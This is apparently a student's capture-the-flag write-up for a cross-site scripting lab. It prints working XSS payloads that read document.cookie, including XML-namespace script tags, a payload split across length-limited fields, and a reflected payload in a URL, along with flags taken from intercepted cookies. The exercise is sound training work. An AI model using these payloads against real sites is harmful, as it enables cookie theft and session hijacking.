# Lab 05 - Cross Site Scripting

Generic payload

```javascript
<script>alert(document.cookie)</script>
```
--- 

# Miami disco
The webiste stored data in an XML file, after searching xml xss payloads we find
```
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/Files/xss.xml
```

The payload is
```xml
<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1)</something:script>
```

But it's too long so we make it
```xml
<test:script xmlns:test="http://www.w3.org/1999/xhtml">alert(document.cookie)</test:script>
```

And we get the flag

```txt
SSS{miami_hot_number}
```

---

# Tactical precision Dissaray
Modified the request with burp (since there was a lenght limit) and added the payload in field 1
```html
<script>alert(document.cookie)</script>
```

Managed to create an XSS, but can't see the flag cookie, will try again tomorrow

---

# Retrogenesis
First labeled each input field and looked at the request
```http
&field411=a15&field412=a16&field413=a17&field414=a18&field422=a19&field421=a20&field424=a21&field423=a22&field433=a23&field431=a24&field434=a25&field432=a26&field444=a27&field443=a28&field442=a29&field441=a39
```

The concatenated string resulted on the website
```html
a15a23a21a18a22a19a24a28
```

Since we can only send a maximul nr of 5 chars we split the payload
```txt
<scri
pt>al
ert(d
ocume
nt.co
okie)
</scr
ipt>
```

Then matching the fields results into
```http
?field411=<scri&field422=okie)&field422=okie)&field433=pt>al&field431=</scr&field443=ipt>&field424=ert(d&field414=ocume&field423=nt.co
```

The flag did not want to display in the pop up, and saw this error
```
Cookie “flag” has been rejected because a non-HTTPS cookie can’t be set as “secure”.
```

Now I realised I can intercept the server request with burp, and there it was

```http
Set-Cookie: flag="SSS{retr0_music_for_the_masses}"; HttpOnly; Path=/; SameSite=Lax; Secure
Set-Cookie: csrftoken=8XXxua2QKrKvwzYoW1y4oWQfBMH1rSIqo2Hdh1zlYo2bBQM6FVaSqZCcD4lF1NJY; expires=Tue, 06 Jul 2027 16:49:54 GMT; Max-Age=31449600; Path=/; SameSite=Lax
```

```txt
SSS{retr0_music_for_the_masses}
```

---

# Future Club
We find some javascript code in the page source
```javascript
function sdwr(_0xaedcx1){return _0xaedcx1["\x63\x68\x61\x72\x41\x74"](0)+ _0xaedcx1["\x73\x6C\x69\x63\x65"](1)}function dggr(_0xaedcx3,_0xaedcx4){return Math["\x66\x6C\x6F\x6F\x72"](Math["\x72\x61\x6E\x64\x6F\x6D"]()* (_0xaedcx4- _0xaedcx3))+ _0xaedcx3}function scsdf(){var _0xaedcx6=["\x66\x75\x74\x75\x72\x65","\x63\x6C\x75\x62","\x79\x6F\x75\x5F\x61\x72\x65\x5F\x6F\x6E\x5F\x79\x6F\x75\x72"];var _0xaedcx7=["\x63\x6C\x75\x62","\x66\x75\x74\x75\x72\x65","\x77\x61\x79","\x53\x53\x53"];var _0xaedcx8=sdwr(_0xaedcx6[dggr(0,_0xaedcx6["\x6C\x65\x6E\x67\x74\x68"])])+ '\x5F'+ sdwr(_0xaedcx7[dggr(0,_0xaedcx7["\x6C\x65\x6E\x67\x74\x68"])]);return _0xaedcx8}var vdsgvsvergvbwe=scsdf();var dfeqwdvdvedvd=window["\x6C\x6F\x63\x61\x74\x69\x6F\x6E"]["\x68\x72\x65\x66"];var bfggbgbgbgbg= new URL(dfeqwdvdvedvd);var vdvsvseghe=bfggbgbgbgbg["\x73\x65\x61\x72\x63\x68\x50\x61\x72\x61\x6D\x73"]["\x67\x65\x74"](vdsgvsvergvbwe);document["\x77\x72\x69\x74\x65"]("\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x30\x3E"+ vdvsvseghe+ "\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E")
```

Deobfuscating it results in
```javascript
function sdwr(str) {
    return str.charAt(0) + str.slice(1);
}

function dggr(min, max) {
    return Math.floor(Math.random() * (max - min)) + min;
}

function scsdf() {
    var arr1 = [
        "future",
        "club",
        "you_are_on_your"
    ];

    var arr2 = [
        "club",
        "future",
        "way",
        "SSS"
    ];

    var param =
        sdwr(arr1[dggr(0, arr1.length)]) +
        "_" +
        sdwr(arr2[dggr(0, arr2.length)]);

    return param;
}

var randomParam = scsdf();

var currentUrl = window.location.href;
var url = new URL(currentUrl);

var value = url.searchParams.get(randomParam);

document.write("<option value=0>" + value + "</option>");
```

Kept calling it with an option untill it worked
```bash
http://141.85.224.102:8083/?future_way=%3Cscript%3Ealert(document.cookie)%3C/script%3E
```

Got this error
```txt
Cookie “flag” has been rejected because a non-HTTPS cookie can’t be set as “secure”.
```

Now trying https
```bash
https://141.85.224.102:8083/?future_way=%3Cscript%3Ealert(document.cookie)%3C/script%3E
```

The secure connection could not be made, the TLS handshake failed

Then I intercepted the response with burp and got
```
Set-Cookie: flag="SSS{future_club_obfuscation}"; HttpOnly;
```

---

# The GOD COMPLEX
After sending multiple payloads we see that it creates the XML entry part by part
1 -> random value
2 -> element name
3 -> attribute name
4 -> attribute value
5 -> content

We have to send in sequence
```
1

xmlns:x

http://www.w3.org/1999/xhtml

alert(document.cookie)

x:script
```

flag
```txt
SSS{got_some_complex?}
```
